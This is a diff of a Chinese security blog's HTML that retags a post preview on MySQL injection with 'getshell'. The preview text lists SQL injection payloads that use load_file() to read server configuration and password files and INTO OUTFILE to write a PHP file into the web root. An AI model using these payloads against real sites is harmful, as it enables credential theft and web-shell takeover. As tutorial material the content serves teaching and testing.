@@ -523,7 +523,9 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
                 
                     <i class="fa fa-tags fa-fw"></i>
                     
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/getshell">getshell</a>
                     
                 
                 
@@ -533,14 +535,12 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
+        0x00 load_file() 读文件  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
  读/etc/init.d下的东西，这里有配置文件路径
 ?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
 ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
-?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
-当知道路径时，可以直接用  id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;)
-或者
-id=1 into outfile 'C:/phpStudy/WWW/a.
+?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile getshell  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
+当知道路径时，可以直接用  id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;) id=1 into outfile 'C:/phpStudy/WWW/a.
     </p>
 
     
@@ -830,7 +830,7 @@ id=1 into outfile 'C:/phpStudy/WWW/a.
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
-                <sup>3</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
